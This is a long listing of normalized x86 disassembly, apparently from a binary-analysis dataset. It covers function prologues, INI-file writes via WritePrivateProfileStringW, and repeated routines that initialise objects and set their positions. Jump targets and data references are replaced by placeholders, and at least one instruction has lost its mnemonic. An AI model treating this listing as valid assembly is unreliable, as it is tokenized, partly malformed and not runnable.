mov edx [ ebx + ecx + 0x90 ]
add [ esp + 0x20 ] edx
call sub_4407b7
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0xd0 ]
lea esi [ esp + 0x60 ]
call sub_429cc0
cmp [ esp + 0x70 ] ebx
jne r-xdata
mov eax [ esp + 0x60 ]
cmp [ esp + 0x74 ] edi
jae r-xdata
push 0x1
mov eax r--data
call sub_429cc0
push eax
call sub_44111e
add esp 0x4
add eax [ esp + 0x14 ]
lea ecx [ esp + 0x5c ]
adc edx [ esp + 0x18 ]
push edx
push eax
push r--data
call sub_41f480
mov ecx [ esp + 0x88 ]
add esp 0xc
cmp [ esp + 0x90 ] edi
jae r-xdata
lea eax [ esp + 0x60 ]
mov eax [ esp + 0x60 ]
cmp [ esp + 0x74 ] edi
jae r-xdata
lea ecx [ esp + 0x7c ]
push ecx
push eax
push r--data
push r--data
call [ WritePrivateProfileStringW@IAT ]
cmp [ esp + 0x74 ] edi
jb r-xdata
lea eax [ esp + 0x60 ]
xor ecx ecx
mov esi 0x7
mov [ esp + 0x74 ] esi
mov [ esp + 0x70 ] ebx
mov [ esp + 0x60 ] cx
cmp [ esp + 0x58 ] edi
jb r-xdata
mov eax [ esp + 0x60 ]
push eax
call sub_43f960
add esp 0x4
xor eax eax
mov [ esp + 0x58 ] esi
mov [ esp + 0x54 ] ebx
mov [ esp + 0x44 ] ax
cmp [ esp + 0x3c ] edi
jb r-xdata
mov edx [ esp + 0x44 ]
push edx
call sub_43f960
add esp 0x4
xor edx edx
mov [ esp + 0x15c ] 0x1
mov [ esp + 0x3c ] esi
mov [ esp + 0x38 ] ebx
mov [ esp + 0x28 ] dx
cmp [ esp + 0x90 ] edi
jb r-xdata
mov ecx [ esp + 0x28 ]
push ecx
call sub_43f960
add esp 0x4
cmp [ esp + 0x20 ] ebx
jle r-xdata
mov eax [ esp + 0x7c ]
push eax
call sub_43f960
add esp 0x4
jmp r-xdata
sub_409a10
push 0xffffffff
push sub_45a748
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x44 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x5c ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x6c ]
mov esi ecx
mov ecx 0x7
xor eax eax
xor edx edx
mov [ esp + 0x1c ] esi
mov [ esp + 0x54 ] ecx
mov [ esp + 0x50 ] eax
mov [ esp + 0x40 ] dx
mov [ esp + 0x64 ] eax
mov [ esp + 0x38 ] ecx
mov [ esp + 0x34 ] eax
mov [ esp + 0x24 ] ax
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x68 ] 0x1
mov eax [ esi + 0x9c ]
mov ecx [ esi + 0x98 ]
lea edx [ esp + 0x40 ]
push edx
push eax
push ecx
call sub_41c6c0
mov eax [ esi + 0x88 ]
add esp 0x10
lea ebx [ esi + 0x74 ]
push r--data
mov edi 0x8
mov ecx ebx
call sub_4298e0
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
push r--data
mov edi 0xa
mov ecx ebx
call sub_4298e0
test eax eax
jne r-xdata
mov edx [ esi + 0x90 ]
push edx
push r--data
lea ecx [ esp + 0x44 ]
call sub_41f480
mov eax r--data
jmp r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x18 ] eax
mov [ esp + 0x64 ] 0x2
mov ecx [ esp + 0x24 ]
mov esi 0x8
cmp [ esp + 0x38 ] esi
jae r-xdata
mov eax [ esi + 0x90 ]
push eax
push r--data
lea ecx [ esp + 0x44 ]
call sub_41f480
mov eax r--data
add esp 0x8
push 0x1
lea esi [ esp + 0x24 ]
call sub_429cc0
mov eax [ esp + 0x40 ]
cmp [ esp + 0x54 ] esi
jae r-xdata
lea ecx [ esp + 0x24 ]
push ecx
push eax
push r--data
lea edi [ esp + 0x24 ]
call sub_412480
add esp 0xc
lea ecx [ esp + 0x1c ]
push ecx
lea ebx [ ebp + 0xe4c ]
call sub_40f810
mov edi [ eax ]
mov ebx [ esp + 0x18 ]
test edi edi
je r-xdata
lea eax [ esp + 0x40 ]
lea eax [ ebx - 0x10 ]
mov [ esp + 0x64 ] 0x1
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov edx [ rw-data ]
mov [ edi + 0x38 ] edx
call sub_422a00
push ebx
push edi
call sub_41ff60
cmp [ esp + 0x38 ] esi
jb r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
xor edx edx
mov [ esp + 0x38 ] 0x7
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] dx
cmp [ esp + 0x54 ] esi
jb r-xdata
mov ecx [ esp + 0x24 ]
push ecx
call sub_43f960
add esp 0x4
mov eax 0x1
mov ecx [ esp + 0x5c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x44 ]
xor ecx esp
call sub_43f96b
add esp 0x54
retn 0x4
mov eax [ esp + 0x40 ]
push eax
call sub_43f960
add esp 0x4
sub_409c20
push 0xffffffff
push sub_45a708
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1c ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
add esi 0x170
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x1c ]
xor ecx esp
call sub_43f96b
add esp 0x2c
retn
xor ecx ecx
mov [ esp + 0x20 ] 0x7
mov [ esp + 0x1c ] eax
mov [ esp + 0xc ] cx
lea ecx [ esp + 0x8 ]
mov [ esp + 0x30 ] eax
call sub_429250
push 0x13
mov eax r--data
lea ecx [ esp + 0xc ]
call sub_429170
lea edx [ esp + 0x8 ]
push esi
push edx
call sub_4026c0
add esp 0x8
cmp [ esp + 0x20 ] 0x8
jb r-xdata
mov eax [ esp + 0xc ]
push eax
call sub_43f960
add esp 0x4
sub_409cf0
sub esp 0x3c
push ebx
push ebp
mov ebx eax
xor ebp ebp
push esi
push edi
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x18c ]
mov esi 0x2
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx edi
call edx
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x1e0 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx edi
call edx
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x234 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx edi
call edx
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x288 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx edi
call edx
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x2b8 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx edi
call edx
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x2e8 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx edi
call edx
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x318 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx edi
call edx
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x348 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx edi
call edx
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x39c ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx edi
call edx
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x3f0 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx edi
call edx
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x444 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx edi
call edx
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x474 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] 0x3ed
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx edi
call edx
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0x4ac ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] 0x3ee
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx esi
call edx
cmp ebx ebp
je r-xdata
mov ecx [ ebx + 0x490 ]
lea eax [ ebx + 0x474 ]
cmp ecx ebp
je r-xdata
mov edi rw-data
call sub_4230c0
mov eax [ rw-data ]
mov edi [ ebx + 0x4a8 ]
lea esi [ ebx + 0x474 ]
mov [ esp + 0x1c ] eax
call sub_4230c0
mov eax [ esp + 0x1c ]
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
push eax
mov eax [ edi + 0xc ]
push eax
push esi
call edx
lea esi [ ebx + 0x4e4 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx esi
call edx
mov eax rw-data
lea esi [ ebx + 0x288 ]
call sub_41f2d0
mov eax rw-data
lea esi [ ebx + 0x2b8 ]
call sub_41f2d0
mov eax rw-data
lea esi [ ebx + 0x2e8 ]
call sub_41f2d0
mov eax rw-data
lea esi [ ebx + 0x318 ]
call sub_41f2d0
mov eax rw-data
lea esi [ ebx + 0x444 ]
call sub_41f2d0
test [ edi + 0x4 ] 0x2
mov [ edi + 0x34 ] rw-data
je r-xdata
test [ ebx + 0x4b0 ] 0x2
mov edi rw-data
mov [ ebx + 0x4e0 ] edi
je r-xdata
mov edx [ ecx ]
push ebp
push ebp
push ebp
push eax
mov eax [ edx + 0x28 ]
call eax
mov ecx [ ebx + 0x4c8 ]
lea edi [ ebx + 0x4ac ]
cmp ecx ebp
je r-xdata
call sub_4230c0
mov ecx [ rw-data ]
mov edi [ ebx + 0x4e0 ]
lea esi [ ebx + 0x4ac ]
mov [ esp + 0x1c ] ecx
call sub_4230c0
mov eax [ esp + 0x1c ]
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
push eax
mov eax [ edi + 0xc ]
push eax
push esi
call edx
mov eax rw-data
lea esi [ ebx + 0x4e4 ]
call sub_41f2d0
mov ecx [ ebx + 0x1a8 ]
mov edx [ ecx ]
lea eax [ ebx + 0x18c ]
push 0x3a
push 0x93
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x1fc ]
mov edx [ ecx ]
lea eax [ ebx + 0x1e0 ]
push 0x4e
push 0x93
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x250 ]
mov edx [ ecx ]
lea eax [ ebx + 0x234 ]
push 0x6e
push 0x62
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x2a4 ]
mov edx [ ecx ]
lea eax [ ebx + 0x288 ]
push 0x65
push 0x93
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x2d4 ]
mov edx [ ecx ]
lea eax [ ebx + 0x2b8 ]
push 0x73
push 0x94
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x304 ]
mov edx [ ecx ]
lea eax [ ebx + 0x2e8 ]
push 0x73
push 0xee
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x334 ]
mov edx [ ecx ]
lea eax [ ebx + 0x318 ]
push 0x73
push 0x145
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x364 ]
mov edx [ ecx ]
lea eax [ ebx + 0x348 ]
push 0x75
push 0xa9
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x3b8 ]
mov edx [ ecx ]
lea eax [ ebx + 0x39c ]
push 0x75
push 0x102
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x40c ]
mov edx [ ecx ]
lea eax [ ebx + 0x3f0 ]
push 0x75
push 0x15a
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x460 ]
mov edx [ ecx ]
lea eax [ ebx + 0x444 ]
push 0x8b
push 0x93
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ ebx + 0x490 ]
mov edx [ ecx ]
lea eax [ ebx + 0x474 ]
push 0xbf
push 0xf0
push eax
mov eax [ edx + 0x24 ]
call eax
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
mov eax [ edx + 0x24 ]
push 0xbf
push 0x151
push edi
call eax
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov eax [ edx + 0x24 ]
push 0x35
push 0x1f
push esi
call eax
cmp ebx ebp
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
push ebp
push ebp
push ebp
push edi
call edx
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0x514 ]
mov edi 0x2
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0x544 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0x5b4 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0xa
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0x5f0 ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] 0x2
mov [ edi + 0x8 ] 0x3ef
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx edi
call eax
mov edx [ edi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx edi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0x628 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0x658 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0x688 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0x6b8 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0x70c ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0x760 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
